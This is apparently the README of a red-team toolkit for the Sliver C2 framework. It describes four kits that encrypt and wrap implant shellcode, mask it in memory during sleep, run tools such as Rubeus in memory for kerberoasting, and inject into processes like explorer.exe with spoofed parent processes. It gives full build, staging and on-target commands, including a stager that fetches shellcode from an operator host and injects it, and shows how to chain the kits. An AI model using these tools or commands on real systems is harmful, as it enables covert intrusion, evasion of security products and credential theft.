# Sliver Defense Evasion Suite

Four independent operator kits for [Sliver C2](https://github.com/BishopFox/sliver). Each kit targets a different stage of the post-exploitation workflow.

---

## Kits

### Crystal-Palace-Kit

**Free Crystal Palace Kit for Sliver.** Two tools:

- **PalaceKit** — native Go reimplementation of `crystalpalace.jar`. Takes the same Crystal Kit `.spec` DSL and C source files, links them with a two-pass COFF linker, and outputs a flat PIC shellcode blob. No Java, no license.
- **CrystalKit** — operator workflow CLI. Encrypts Sliver shellcode with ChaCha20-Poly1305, cross-compiles a Go process injector for Windows, and stages it over a one-shot HTTPS server.

### Sleep-Mask-Kit

**First Sliver port of the Cobalt Strike Sleep Mask Kit.** Two implementations:

- **MaskKit** — pure C PIC shellcode. Wraps a Sliver shellcode, installs an inline hook on `NtWaitForSingleObject`, and XOR-encrypts the Sliver region + changes it to `PAGE_READWRITE` during C2 sleep. Stack spoofing via ntdll RET gadget.
- **SleepKit** — Go host binary. Fetches Sliver shellcode over HTTPS, runs it, and masks on a timer + `kernel32!Sleep` hook.

### Loader-Kit

**In-memory PE execution for Sliver** — the equivalent of Cobalt Strike's `execute-assembly`. Convert any native EXE, DLL, or .NET assembly to Donut shellcode on your machine, encrypt it, and run it inside an active Sliver session via a Sliver Extension DLL. Output is captured and returned to the console. No files written to disk on the target.

### Inject-Kit

**Remote process injection with PPID spoofing.** Injects shellcode into a remote process using NT-native APIs — no RWX pages, no kernel32 `VirtualAllocEx`/`WriteProcessMemory`. Two injection modes:

- **target=** — inject into an existing running process (`explorer.exe`, `dllhost.exe`, etc.)
- **spawn=** + **ppid=** — spawn a sacrificial process suspended with its parent spoofed to a legitimate process, then inject into it. The shellcode ends up running inside `RuntimeBroker.exe` that appears to have been started by `explorer.exe`.

Two delivery options: a standalone `injectkit.exe` for when you don't have a session yet, and a Sliver Extension (`inject.x64.dll`) for use from within an active session.

---

## Quick Start

### Prerequisites

All kits require the same base:

```bash
# Cross-compiler for Windows targets
apt install mingw-w64

# Go 1.21+ — verify with:
go version
```

### Crystal-Palace-Kit — PalaceKit

```bash
cd Crystal-Palace-Kit/palacekit

# 1. Compile the C loader objects + build the CLI
make all

# 2. Generate a Sliver shellcode (in Sliver console)
#    sliver > generate --format shellcode --os windows --arch amd64 --save implant.bin

# 3. Wrap it
./palacekit build --shellcode implant.bin --output build/palace.bin

# 4. Serve once over HTTPS
./palacekit serve --payload build/palace.bin --port 8443
```

Full docs: [Crystal-Palace-Kit/DOCUMENTATION.md](Crystal-Palace-Kit/DOCUMENTATION.md)

### Sleep-Mask-Kit — MaskKit

```bash
cd Sleep-Mask-Kit/maskkit

# 1. Compile + build CLI
make all

# 2. Wrap a Sliver shellcode
./maskkit wrap --shellcode implant.bin --output build/masked.bin

# 3. Serve
./maskkit serve --payload build/masked.bin --port 8443
```

Full docs: [Sleep-Mask-Kit/DOCUMENTATION.md](Sleep-Mask-Kit/DOCUMENTATION.md)

### Loader-Kit

```bash
cd Loader-Kit/loadkit

# 1. Build everything (CLI + extension DLL + bundle)
make all

# 2. Install the Sliver extension (once per server)
#    sliver > extensions install build/load-0.1.0.tar.gz

# 3. Convert a binary and serve
./loadkit load --binary rubeus.exe --args "kerberoast /nowrap" \
    --url https://YOUR_IP:8443/p --serve

# 4. Run in Sliver
#    sliver (TARGET)> load url=https://YOUR_IP:8443/... key=<printed key>
```

Full docs: [Loader-Kit/DOCUMENTATION.md](Loader-Kit/DOCUMENTATION.md)

### Inject-Kit

```bash
cd Inject-Kit/injectkit

# 1. Build everything (operator CLI + Windows EXE + extension DLL + bundle)
make all

# 2. Encrypt shellcode and start staging server
./injectkit stage --shellcode implant.bin --url https://YOUR_IP:8443/p --serve

# 3a. Standalone — run injectkit.exe directly on the target:
#     injectkit.exe -mode stager -url https://YOUR_IP:8443/p -key <key> -target explorer.exe
#     injectkit.exe -mode stager -url https://YOUR_IP:8443/p -key <key> -spawn RuntimeBroker.exe -ppid explorer.exe

# 3b. Sliver Extension — install once then use from any session:
#     sliver (TARGET)> extensions install build/inject-0.1.0.tar.gz
#     sliver (TARGET)> inject url=https://YOUR_IP:8443/p key=<key> target=explorer.exe
#     sliver (TARGET)> inject url=https://YOUR_IP:8443/p key=<key> spawn=RuntimeBroker.exe ppid=explorer.exe
```

Full docs: [Inject-Kit/DOCUMENTATION.md](Inject-Kit/DOCUMENTATION.md)

---

## Combining the Kits

The kits are designed to stack. Common combinations:

**Sleep-masked Crystal Kit loader:**
```bash
# 1. Wrap Sliver shellcode with sleep masker
cd Sleep-Mask-Kit/maskkit
./maskkit wrap --shellcode implant.bin --output build/masked.bin

# 2. Wrap the masked shellcode with Crystal Kit loader (adds no-IAT, PIC)
cd ../../Crystal-Palace-Kit/palacekit
./palacekit build --shellcode ../../Sleep-Mask-Kit/maskkit/build/masked.bin \
    --output build/final.bin

# 3. Serve and deliver
./palacekit serve --payload build/final.bin
```

**Hardened payload delivered via process injection:**
```bash
# 1. Wrap with MaskKit (sleep masking)
./maskkit wrap --shellcode implant.bin --output masked.bin

# 2. Wrap with PalaceKit (PIC loader, no IAT)
./palacekit build --shellcode masked.bin --output palace.bin

# 3. Stage with InjectKit and inject into a spoofed process
./injectkit stage --shellcode palace.bin --url https://YOUR_IP:8443/p --serve
# sliver (TARGET)> inject url=... key=... spawn=RuntimeBroker.exe ppid=explorer.exe
```

**In-memory tool execution with Crystal Kit staging:**
```bash
# Stage Rubeus via LoadKit, inside a session obtained via PalaceKit/InjectKit
cd Loader-Kit/loadkit
./loadkit load --binary rubeus.exe --args "kerberoast /nowrap" \
    --url https://YOUR_IP:8443/p --serve
# sliver (TARGET)> load url=... key=...
```

---

## Folder Layout

```
Sliver-Evasion-Suite/
├── Crystal-Palace-Kit/
│   ├── palacekit/          # Go COFF linker + Crystal Kit spec evaluator
│   ├── crystalkit/         # Crystal Palace operator workflow CLI
│   └── DOCUMENTATION.md
├── Sleep-Mask-Kit/
│   ├── maskkit/            # C shellcode sleep masker (NtWaitForSingleObject hook)
│   ├── sleepkit/           # Go host binary sleep masker
│   └── DOCUMENTATION.md
├── Loader-Kit/
│   ├── loadkit/            # Donut → encrypt → serve + Sliver Extension DLL
│   └── DOCUMENTATION.md
└── Inject-Kit/
    ├── injectkit/          # NT-native remote injection + PPID spoof, standalone EXE + Sliver Extension DLL
    └── DOCUMENTATION.md
```
